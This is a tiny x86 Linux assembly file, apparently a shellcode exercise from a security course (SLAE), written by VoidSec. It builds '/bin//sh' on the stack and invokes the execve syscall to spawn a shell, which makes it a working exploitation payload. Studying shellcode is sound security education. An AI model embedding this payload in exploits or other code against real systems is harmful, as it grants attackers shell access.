; Paolo Stagno aka [VoidSec](https://voidsec.com)
; SLAE-1511
; mul: multiply eax value with arg  (ecx), result stored in eax,edx
xor ecx, ecx
mul ecx
push eax
mov edi, 0x68732f2f
mov esi, 0x6e69622f
push edi
push esi
mov ebx, esp
mov al, 0xb
int 0x80